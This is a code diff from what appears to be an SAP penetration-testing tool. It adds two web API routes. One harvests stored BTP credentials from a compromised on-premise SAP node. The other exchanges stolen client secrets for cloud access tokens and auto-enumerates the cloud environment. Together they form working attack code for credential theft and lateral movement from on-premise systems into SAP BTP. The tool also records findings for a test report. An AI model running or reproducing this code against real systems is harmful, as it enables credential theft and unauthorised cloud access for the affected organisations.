@@ -2971,6 +2971,76 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 f"Could not schedule scan for {sid}"})
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/harvest_btp_creds", method="POST")
+    def node_harvest_btp_creds(sid):
+        """Scan a pwned on-prem node for stored BTP-bound credentials
+        (SM59 destinations to *.hana.ondemand.com, ABAP RSECTAB
+        entries, Java SecStoreFS rows).  Returns the candidates
+        directly — minting is a separate, explicit step (operator
+        picks which secret to exchange so accidental authentication
+        attempts don't fan out)."""
+        from sap_onprem_to_btp import harvest_btp_candidates
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        cands = harvest_btp_candidates(api.state, node)
+        print(f"[*] {sid}: harvested {len(cands)} BTP credential "
+              f"candidate(s) from existing captures")
+        return json.dumps({"candidates": cands})
+
+    @app.route("/api/node/<sid>/mint_btp_token", method="POST")
+    def node_mint_btp_token(sid):
+        """Exchange a captured (uaa_url, client_id, client_secret) for
+        a BTP access token via XSUAA's `/oauth/token` and store it in
+        api.btp_tokens.  Auto-fires the existing /api/btp/enumerate
+        flow against the resulting region so the cloud topology
+        appears on the map without a second click."""
+        from sap_onprem_to_btp import mint_btp_token
+        from sap_btp import (extract_region_from_token,
+                              decode_token_claims)
+        response.content_type = "application/json"
+        data = request.json or {}
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        uaa_url = (data.get("uaa_url") or "").strip()
+        client_id = (data.get("client_id") or "").strip()
+        client_secret = (data.get("client_secret") or "").strip()
+        if not uaa_url or not client_id or not client_secret:
+            return json.dumps({"error":
+                "uaa_url, client_id and client_secret are required"})
+        token, err = mint_btp_token(uaa_url, client_id, client_secret)
+        if err:
+            print(f"[-] {sid}: BTP token mint failed — {err}")
+            return json.dumps({"ok": False, "error": err})
+        region = extract_region_from_token(token) or ""
+        if not region:
+            return json.dumps({"ok": False,
+                               "error": ("token minted but region could "
+                                          "not be derived from iss claim")})
+        api.btp_tokens[region] = token
+        claims = decode_token_claims(token)
+        print(f"[+] {sid}: BTP token minted for region {region!r} "
+              f"(cid={claims.get('cid', '?')}, "
+              f"sub={claims.get('sub', '?')[:12]}…)")
+        # Emit a finding so the lateral move is recorded in the report
+        try:
+            sapmap_findings.emit_finding(
+                "CRITICAL", sid,
+                f"On-prem → BTP lateral: minted access token for "
+                f"region {region} from credentials harvested off "
+                f"{sid}.  Token grants whatever scopes the bound "
+                f"service-key carries (typically destination read).",
+                ref="onprem.to.btp.token_minted",
+                meta={"region": region, "client_id": client_id,
+                      "uaa_url": uaa_url})
+        except Exception:
+            pass
+        return json.dumps({"ok": True, "region": region,
+                           "auto_enumerate_url":
+                               "/api/btp/pull_destinations_for_token"})
+
     @app.route("/api/node/<sid>/set_type", method="POST")
     def node_set_type(sid):
         response.content_type = "application/json"
